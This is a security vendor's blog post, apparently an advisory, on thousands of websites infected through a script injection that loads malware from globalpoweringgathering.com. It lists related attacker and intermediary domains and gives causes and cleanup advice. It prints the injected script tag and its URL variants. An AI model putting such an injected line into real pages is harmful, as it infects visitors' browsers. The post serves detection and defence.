Mass infections –  globalpoweringgathering.com

We first detected malware from globalpoweringgathering.com almost a month ago, and posted on our blog about it. But in the last few days, we started to see a big increase in the number of sites infected with it.
We were able to catalog almost 3 thousand sites with this malware and Google lists almost 2 thousand sites in their safe browsing page (and it is growing each day – just yesterday it was less than 1 thousand):

Has this site hosted malware?
Yes, this site has hosted malicious software over the past 90 days. It infected 1815 domain(s), including clonestop.com/, warseer.com/, showbiz411.com/.

On our original post, we detailed the malware which was injecting an encoded javascript directly in the WordPress database. However, on the latest infections, we are seeing the following code added directly to the HTML or PHP files (with no obfuscation):

<script src="http://globalpoweringgathering.com/in.php?n=15"..

With some variations, with just a number changing:

http://globalpoweringgathering.com/in.php?n=15
http://globalpoweringgathering.com/in.php?n=25
http://globalpoweringgathering.com/in.php?n=2
http://globalpoweringgathering.com/in.php?n=9

Note that these are very similar to the “Hilary Kneber” malware distributed by these domains (hosted on the same IP addresses):

globalpoweringgathering.com
lessthenaminutehandle.com
lessthenaseconddeal.com
welcometotheglobalisnet.com

How are these sites getting hacked?
We are seeing multiple causes. The most common is related the usage of old versions of web applications (like WordPress, Joomla, etc). However, we are also seeing HTML-only sites hacked that are getting compromised via FTP due to stolen passwords. So make sure your sites are updated and change your passwords (making sure to use a strong password, that your desktop is not compromised, etc).
Other domains being used as intermediaries:

543ge.cz.cc
gtrregrw.cz.cc
leased-ltx.cz.cc
legacy-tools.cz.cc
notyfiwgt.co.cc
rthlsinks.cz.cc
sajko.co.cc
upsreleased.cz.cc
wretery.cz.cc
avi7o.co.cc
tempviews.cz.cc
viables.cz.cc

If you need any help cleaning up an infected site (or someone to do it for you), let us know.
